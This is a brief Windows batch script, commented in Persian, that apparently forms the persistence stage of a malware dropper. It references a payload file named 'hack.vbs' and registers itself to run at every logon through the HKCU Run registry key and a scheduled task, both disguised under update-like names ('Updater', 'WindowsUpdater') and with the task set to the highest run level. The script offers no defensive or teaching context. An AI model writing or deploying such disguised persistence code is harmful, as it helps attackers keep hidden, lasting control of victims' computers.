@echo off
set payloadPath=C:\Users\Public\Videos\hack.vbs
set taskName=WindowsUpdater

:: اضافه کردن به استارت‌آپ (Registry)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%~f0" /f

:: ایجاد Scheduled Task برای اجرای بات‌فایل پس از هر ری‌استارت
schtasks /create /sc onlogon /tn %taskName% /tr "%~f0" /f /rl highest
